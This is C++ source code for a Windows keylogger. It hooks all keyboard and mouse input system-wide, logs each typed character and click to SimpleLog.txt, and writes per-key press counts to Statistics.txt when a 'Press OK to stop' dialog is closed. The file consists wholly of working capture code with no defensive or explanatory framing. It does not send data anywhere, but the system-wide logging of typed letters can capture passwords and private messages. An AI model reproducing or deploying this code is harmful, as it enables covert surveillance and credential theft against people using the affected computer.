#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>

std::ofstream out ("SimpleLog.txt", std::ios::out);
std::ofstream out2 ("Statistics.txt", std::ios::out);

struct Keylog{
    std::string key_name;
    int press_count = 0;
}Caps, LShift, RShift, LCtrl, RCtrl, Insert, Delete, BackSpace, Left, Right, Up, Down, Letter, LMB, RMB, MMove;

LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam){
    LMB.key_name = "LeftMouse Button", RMB.key_name = "RightMouse Button", MMove.key_name = "Mouse";
    if (nCode >= 0)
    {
        if (wParam == WM_MOUSEMOVE){
            out << "Mouse Moved" << std::endl;
            MMove.press_count += 1;
        }
        if (wParam == WM_LBUTTONDOWN){
            out << "LMB" << std::endl;
            LMB.press_count++;
        }

        if (wParam == WM_RBUTTONDOWN){
            out << "RMB" << std::endl;
            RMB.press_count++;
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam){
    auto p = (PKBDLLHOOKSTRUCT) (lParam);
    Caps.key_name = "CapsLock", LShift.key_name = "LSHIFT", RShift.key_name = "RSHIFT", LCtrl.key_name = "LCTRL",
    RCtrl.key_name = "RCTRL", Insert.key_name = "Insert", Delete.key_name = "Delete", BackSpace.key_name = "BackSpace",
    Left.key_name = "Left", Right.key_name = "Right", Up.key_name = "Up", Down.key_name = "Down",
    Letter.key_name = "Letters";
    if(wParam == WM_KEYDOWN){
        switch(p->vkCode){
            case VK_CAPITAL:
                Caps.press_count++;
                out << "<CAPSLOCK>" << std::endl;
                break;
            case VK_LSHIFT:
                LShift.press_count++;
                out << "<LSHIFT>" << std::endl;
                break;
            case VK_RSHIFT:
                RShift.press_count++;
                out << "<RSHIFT>" << std::endl;
                break;
            case VK_LCONTROL:
                LCtrl.press_count++;
                out << "<LCTRL>" << std::endl;
                break;
            case VK_RCONTROL:
                RCtrl.press_count++;
                out << "<RCTRL>" << std::endl;
                break;
            case VK_INSERT:
                Insert.press_count++;
                out << "<INSERT>" << std::endl;
                break;
            case VK_DELETE:
                Delete.press_count++;
                out << "<DEL>" << std::endl;
                break;
            case VK_BACK:
                BackSpace.press_count++;
                out << "<BK>" << std::endl;
                break;
            case VK_LEFT:
                Left.press_count++;
                out << "<LEFT>" << std::endl;
                break;
            case VK_RIGHT:
                Right.press_count++;
                out << "<RIGHT>" << std::endl;
                break;
            case VK_UP:
                Up.press_count++;
                out << "<UP>" << std::endl;
                break;
            case VK_DOWN:
                Down.press_count++;
                out << "<DOWN>" << std::endl;
                break;
            default:
                Letter.press_count++;
                out << char(tolower(p->vkCode)) << std::endl;
                break;
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInsance, LPSTR lpCmdLine, int nShowCdm){
    HHOOK keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, hInstance, 0);
    HHOOK mousehook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, hInstance, 0);
    MessageBox(nullptr, "Press OK to stop", "Menu", MB_OK);
    out.close();
    if(Caps.press_count) out2 << Caps.key_name << " pressed: " << Caps.press_count << std::endl;
    if(LShift.press_count) out2 << LShift.key_name << " pressed: " << LShift.press_count << std::endl;
    if(RShift.press_count) out2 << RShift.key_name << " pressed: " << RShift.press_count << std::endl;
    if(LCtrl.press_count) out2 << LCtrl.key_name << " pressed: " << LCtrl.press_count << std::endl;
    if(RCtrl.press_count) out2 << RCtrl.key_name << " pressed: " << RCtrl.press_count << std::endl;
    if(Insert.press_count) out2 << Insert.key_name << " pressed: " << Insert.press_count << std::endl;
    if(Delete.press_count) out2 << Delete.key_name << " pressed: " << Delete.press_count << std::endl;
    if(BackSpace.press_count) out2 << BackSpace.key_name << " pressed: " << BackSpace.press_count << std::endl;
    if(Left.press_count) out2 << Left.key_name << " pressed: " << Left.press_count << std::endl;
    if(Right.press_count) out2 << Right.key_name << " pressed: " << Right.press_count << std::endl;
    if(Up.press_count) out2 << Up.key_name << " pressed: " << Up.press_count << std::endl;
    if(Down.press_count) out2 << Down.key_name << " pressed: " << Down.press_count << std::endl;
    if(Letter.press_count) out2 << Letter.key_name << " were typed: " << Letter.press_count << std::endl;
    if(LMB.press_count) out2 << LMB.key_name << " pressed: " << LMB.press_count << std::endl;
    if(RMB.press_count) out2 << RMB.key_name << " pressed: " << RMB.press_count << std::endl;
    if(MMove.press_count) out2 << MMove.key_name << " was moved onto: " << MMove.press_count << " pixels" << std::endl;
    out2.close();
    return 0;
}
